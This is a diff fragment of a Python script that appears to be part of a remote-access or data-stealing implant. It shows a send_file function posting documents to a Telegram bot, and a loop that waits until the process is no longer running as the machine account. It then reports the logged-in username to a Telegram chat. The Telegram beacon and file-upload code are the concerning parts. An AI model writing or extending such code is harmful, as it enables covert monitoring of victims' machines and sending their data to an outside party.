@@ -22,19 +22,21 @@ def send_file(chat_id, token, filepath):
         }
     r = requests.post(f"https://api.telegram.org/bot{token}/sendDocument", data=data, files=files)
 
-def is_user_logged_in():
-    output = subprocess.check_output(["echo", "%username%"], shell=True, text=True).strip()
-    if "SYSTEM" in output:
-        return False, output
-    else:
-        return True, output
+def get_computer_name():
+    computer_name = subprocess.check_output(["echo", "%COMPUTERNAME%"], shell=True, text=True).strip()
+    return computer_name
+
+def get_username():
+    username = subprocess.check_output(["echo", "%username%"], shell=True, text=True).strip()
+    return username
 
 while True:
-    logged_in, output = is_user_logged_in()
-    if logged_in:
-        send_message(chat_id, token, "User logged.")
-        os.system(f"msg * logged:{str(output)}")
-        break
-    else:
-        os.system(f"msg * notlogged:{str(output)}")
+    username = get_username()
+    computer_name = get_computer_name()
+    if f"{str(computer_name)}$" in str(username):
+        os.system(f"msg * notlogged:{str(username)}")
         time.sleep(5)
+    else:
+        send_message(chat_id, token, f"User logged:{str(username)}")
+        os.system(f"msg * logged:{str(username)}")
+        break
